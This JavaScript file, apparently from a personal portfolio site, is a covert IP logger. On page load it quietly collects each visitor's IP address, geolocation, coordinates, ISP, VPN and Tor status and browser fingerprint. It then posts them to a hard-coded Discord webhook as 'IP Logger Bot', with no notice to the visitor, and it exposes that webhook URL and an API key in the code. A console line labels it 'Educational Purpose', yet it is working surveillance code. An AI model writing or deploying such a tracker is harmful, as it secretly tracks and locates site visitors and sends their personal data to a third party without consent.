//Webhook IP
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1397165010702172180/fEOUreMdx4Q7oGebxqlveBZOL4brnQ9VxpUIwwKysvTGeq70GHMWiTSuH4Hw0_Us5ppg';
const API_KEY = 'a4b4abd805edfe3e4e0e6a91f922efa4';

async function logVisitor() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const visitorIP = ipData.ip;

        const locationResponse = await fetch(`https://iplocate.io/api/lookup/${visitorIP}?apikey=${API_KEY}`);
        const locationData = await locationResponse.json();

        const browserInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct Visit',
            currentPage: window.location.href
        };

        const embed = {
            title: "🔍 New Website Visitor",
            color: 0x00ff00, 
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📍 Location Information",
                    value: `**IP:** ${locationData.ip}\n**Country:** ${locationData.country} (${locationData.country_code})\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.subdivision || 'Unknown'}\n**Timezone:** ${locationData.time_zone || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🌐 Network Information",
                    value: `**ISP:** ${locationData.company?.name || 'Unknown'}\n**ASN:** ${locationData.asn?.asn || 'Unknown'}\n**Network:** ${locationData.network || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🔒 Security Flags",
                    value: `**VPN:** ${locationData.privacy?.is_vpn ? '✅' : '❌'}\n**Proxy:** ${locationData.privacy?.is_proxy ? '✅' : '❌'}\n**Tor:** ${locationData.privacy?.is_tor ? '✅' : '❌'}\n**Datacenter:** ${locationData.privacy?.is_datacenter ? '✅' : '❌'}`,
                    inline: true
                },
                {
                    name: "💻 Device Information",
                    value: `**Platform:** ${browserInfo.platform}\n**Language:** ${browserInfo.language}\n**Screen:** ${browserInfo.screenResolution}\n**Timezone:** ${browserInfo.timezone}`,
                    inline: true
                },
                {
                    name: "🌐 Browser Information",
                    value: `**User Agent:** ${browserInfo.userAgent.substring(0, 100)}...\n**Referrer:** ${browserInfo.referrer}\n**Page:** ${browserInfo.currentPage}`,
                    inline: false
                }
            ],
            footer: {
                text: "Portfolio",
                icon_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
            }
        };

        if (locationData.latitude && locationData.longitude) {
            embed.fields.push({
                name: "🧭 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Long:** ${locationData.longitude}\n[View on Map](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude})`,
                inline: true
            });
        }

        // Send to Discord webhook
        const webhookData = {
            embeds: [embed],
            username: "IP Logger Bot",
            avatar_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });

        console.log('Visitor data logged successfully (Educational Purpose)');

    } catch (error) {
        console.error('Error logging visitor data:', error);
        
        try {
            const errorEmbed = {
                title: "❌ IP Logger Error",
                color: 0xff0000,
                description: `Error occurred while logging visitor: ${error.message}`,
                timestamp: new Date().toISOString()
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [errorEmbed],
                    username: "IP Logger Bot"
                })
            });
        } catch (webhookError) {
            console.error('Failed to send error to Discord:', webhookError);
        }
    }
}

function shouldLogVisitor() {
    const lastLog = localStorage.getItem('lastIPLog');
    const now = Date.now();
    const oneHour = 60 * 60 * 1000; 

    if (!lastLog || (now - parseInt(lastLog)) > oneHour) {
        localStorage.setItem('lastIPLog', now.toString());
        return true;
    }
    return false;
}

document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        if (shouldLogVisitor()) {
            logVisitor();
        }
    }, 1000);
});

window.addEventListener('beforeunload', function() {
    console.log('User leaving page');
});

window.testIPLogger = logVisitor;